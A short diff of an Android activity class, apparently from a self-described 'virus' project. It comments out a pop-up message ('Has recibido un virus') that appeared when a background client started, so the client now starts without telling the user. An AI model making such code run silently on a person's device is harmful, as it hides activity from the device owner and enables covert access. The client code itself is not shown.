@@ -87,8 +87,8 @@ public class PopUp extends Activity {
                     //System.out.println("Iniciando cliente\n");
                     cli.startClient(); //Se inicia el cliente
 
-                    Toast.makeText(getApplicationContext(),
-                            "Has recibido un virus (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧", Toast.LENGTH_SHORT).show();
+                   // Toast.makeText(getApplicationContext(),
+                     //       "Has recibido un virus (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧", Toast.LENGTH_SHORT).show();
                 }catch (IOException e){
                     System.out.println(e);
                 }
